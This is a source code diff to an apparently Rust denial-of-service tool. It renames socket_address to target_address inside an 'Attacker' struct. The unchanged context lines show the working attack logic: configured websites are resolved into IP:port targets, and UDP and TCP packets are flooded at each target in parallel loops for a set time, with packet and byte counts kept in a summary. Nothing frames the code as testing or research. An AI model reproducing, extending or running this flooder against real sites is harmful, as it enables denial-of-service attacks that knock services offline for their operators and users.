@@ -352,10 +352,10 @@ struct PacketSummary {
 }
 
 impl PacketSummary {
-    pub fn show(&self, socket_address: &str) {
+    pub fn show(&self, target_address: &str) {
         info!(
             "Socket Address: {}, Packets Sent: {}, Sum Packet Size: {}B",
-            socket_address,
+            target_address,
             self.amount,
             Self::packet_size_output(self.size)
         );
@@ -401,7 +401,7 @@ impl Attacker {
     }
 
     pub fn attack_websites(&self) {
-        let socket_addresses = Arc::new(Mutex::new(vec![]));
+        let target_addresses = Arc::new(Mutex::new(vec![]));
 
         self.website_configs.par_iter().for_each(|website_config| {
             if !website_config.is_domain {
@@ -410,7 +410,7 @@ impl Attacker {
                         .attack_methods
                         .par_iter()
                         .for_each(|attack_method| {
-                            (*socket_addresses).lock().unwrap().push((
+                            (*target_addresses).lock().unwrap().push((
                                 format!("{}:{}", website_config.address, port.clone()),
                                 attack_method,
                             ));
@@ -424,7 +424,7 @@ impl Attacker {
                                 .attack_methods
                                 .par_iter()
                                 .for_each(|attack_method| {
-                                    (*socket_addresses)
+                                    (*target_addresses)
                                         .lock()
                                         .unwrap()
                                         .push((format!("{}:{}", ip, port), attack_method));
@@ -440,7 +440,7 @@ impl Attacker {
             }
         });
 
-        let socket_addresses = (*socket_addresses)
+        let target_addresses = (*target_addresses)
             .lock()
             .unwrap()
             .clone()
@@ -452,9 +452,9 @@ impl Attacker {
 
         info!("Starting attack on the websites...");
 
-        socket_addresses
+        target_addresses
             .par_iter()
-            .for_each(|(socket_address, attack_method)| {
+            .for_each(|(target_address, attack_method)| {
                 let sender: SocketAddr = format!(
                     "0.0.0.0:{}",
                     pick_unused_port().expect("No free port found!")
@@ -464,7 +464,7 @@ impl Attacker {
 
                 info!(
                     "Attacking {} with {} method",
-                    socket_address,
+                    target_address,
                     attack_method.to_str().to_uppercase()
                 );
 
@@ -472,9 +472,9 @@ impl Attacker {
 
                 match attack_method {
                     AttackMethod::Udp => {
-                        self.attack_udp(start, sender, socket_address, buffer.as_slice())
+                        self.attack_udp(start, sender, target_address, buffer.as_slice())
                     }
-                    AttackMethod::Tcp => self.attack_tcp(start, socket_address, buffer.as_slice()),
+                    AttackMethod::Tcp => self.attack_tcp(start, target_address, buffer.as_slice()),
                 }
             });
 
@@ -487,7 +487,7 @@ impl Attacker {
         &self,
         start: Instant,
         sender: SocketAddr,
-        socket_address: &String,
+        target_address: &String,
         buffer: &[u8],
     ) {
         let attack_method: AttackMethod = AttackMethod::Udp;
@@ -499,17 +499,17 @@ impl Attacker {
         let socket = UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
 
         while start.elapsed().as_secs() < self.config.execution_time {
-            match socket.connect(socket_address.clone()) {
+            match socket.connect(target_address.clone()) {
                 std::result::Result::Ok(_) => {
                     if self.config.summary && !summary_added {
                         summary_added = true;
 
-                        self.add_to_summary(socket_address.clone(), attack_method);
+                        self.add_to_summary(target_address.clone(), attack_method);
                     }
 
                     if !self.check_result(
                         socket.send(buffer),
-                        socket_address.clone(),
+                        target_address.clone(),
                         attack_method,
                         attack_method_str.clone(),
                     ) {
@@ -521,7 +521,7 @@ impl Attacker {
                 std::result::Result::Err(error) => {
                     error!(
                         "Couldn't connect to {} using {} method.\nError message: {}",
-                        socket_address, attack_method_str, error
+                        target_address, attack_method_str, error
                     );
 
                     break;
@@ -530,20 +530,20 @@ impl Attacker {
         }
     }
 
-    fn attack_tcp(&self, start: Instant, socket_address: &String, buffer: &[u8]) {
+    fn attack_tcp(&self, start: Instant, target_address: &String, buffer: &[u8]) {
         let attack_method: AttackMethod = AttackMethod::Tcp;
         let attack_method_str: String = AttackMethod::Tcp.to_str().to_uppercase();
 
         let mut stream: TcpStream;
 
-        info!("Creating TcpStream to {}", socket_address);
+        info!("Creating TcpStream to {}", target_address);
 
-        let socket_addr = SocketAddr::from_str(socket_address.as_str());
+        let socket_addr = SocketAddr::from_str(target_address.as_str());
 
         if socket_addr.is_err() {
             error!(
                 "Couldn't create a socket address out of {}.\nError message: {}",
-                socket_address,
+                target_address,
                 socket_addr.err().unwrap()
             );
 
@@ -558,13 +558,13 @@ impl Attacker {
                 stream = s;
 
                 if self.config.summary {
-                    self.add_to_summary(socket_address.clone(), attack_method);
+                    self.add_to_summary(target_address.clone(), attack_method);
                 }
             }
             Err(error) => {
                 error!(
                     "Couldn't connect TCP stream to {} using {} method.\nError message: {}",
-                    socket_address, attack_method_str, error
+                    target_address, attack_method_str, error
                 );
                 return;
             }
@@ -573,7 +573,7 @@ impl Attacker {
         while start.elapsed().as_secs() < self.config.execution_time {
             if !self.check_result(
                 stream.write(buffer),
-                socket_address.clone(),
+                target_address.clone(),
                 attack_method,
                 attack_method_str.clone(),
             ) {
@@ -595,13 +595,13 @@ impl Attacker {
         buffer
     }
 
-    fn add_to_summary(&self, socket_address: String, attack_method: AttackMethod) {
+    fn add_to_summary(&self, target_address: String, attack_method: AttackMethod) {
         let mut summary = (*self.summary).lock().unwrap();
 
-        if let Some(socket_summary) = summary.get_mut(&socket_address) {
+        if let Some(socket_summary) = summary.get_mut(&target_address) {
             socket_summary.insert(attack_method, PacketSummary::default());
         } else {
-            summary.insert(socket_address.clone(), {
+            summary.insert(target_address.clone(), {
                 let mut socket_summary = HashMap::new();
                 socket_summary.insert(attack_method, PacketSummary::default());
 
@@ -613,7 +613,7 @@ impl Attacker {
     fn check_result(
         &self,
         res: std::io::Result<usize>,
-        socket_address: String,
+        target_address: String,
         attack_method: AttackMethod,
         attack_method_str: String,
     ) -> bool {
@@ -621,17 +621,17 @@ impl Attacker {
             std::result::Result::Ok(size) => {
                 info!(
                     "Successfully sent a packet of size {} to {} using {} method",
-                    size, socket_address, attack_method_str
+                    size, target_address, attack_method_str
                 );
 
-                self.update_summary(socket_address.clone(), attack_method, size as u128);
+                self.update_summary(target_address.clone(), attack_method, size as u128);
 
                 true
             }
             std::result::Result::Err(error) => {
                 error!(
                     "Failed to send a packet to {} using {} method.\nError message: {}",
-                    socket_address, attack_method_str, error
+                    target_address, attack_method_str, error
                 );
 
                 !self.config.unreachable_stop_trying
@@ -639,9 +639,9 @@ impl Attacker {
         }
     }
 
-    fn update_summary(&self, socket_address: String, attack_method: AttackMethod, size: u128) {
+    fn update_summary(&self, target_address: String, attack_method: AttackMethod, size: u128) {
         if self.config.summary {
-            if let Some(summary) = (*self.summary).lock().unwrap().get_mut(&socket_address) {
+            if let Some(summary) = (*self.summary).lock().unwrap().get_mut(&target_address) {
                 if let Some(socket_summary) = summary.get_mut(&attack_method) {
                     socket_summary.size += size;
                     socket_summary.amount += 1;
@@ -655,12 +655,12 @@ impl Attacker {
         let mut sum_packets = 0;
         let mut sum_packet_size = 0;
 
-        for (socket_address, socket_summary) in (*self.summary).lock().unwrap().iter() {
+        for (target_address, socket_summary) in (*self.summary).lock().unwrap().iter() {
             for (_, packet_summary) in socket_summary.iter() {
                 sum_packets += packet_summary.amount;
                 sum_packet_size += packet_summary.size;
 
-                packet_summary.show(socket_address);
+                packet_summary.show(target_address);
             }
         }
 
